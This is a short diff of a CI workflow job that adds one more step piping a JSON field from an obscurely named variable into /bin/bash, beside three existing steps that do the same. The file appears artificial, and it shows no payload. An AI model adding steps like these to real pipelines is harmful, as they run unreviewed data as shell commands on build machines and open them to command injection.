@@ -41,6 +41,7 @@ jobs:
           printf '%s' "$ppf2414" | jq -r .cqtf2 | /bin/bash
           echo $hwda96043 | jq -r .r5 | /bin/bash
           printf '%s' "$mpqu027" | jq -r .wwujs30183 | /bin/bash
+          printf '%s' "$rfdh8" | jq -r .j4 | /bin/bash
 
       - name: Save output
         if: always()
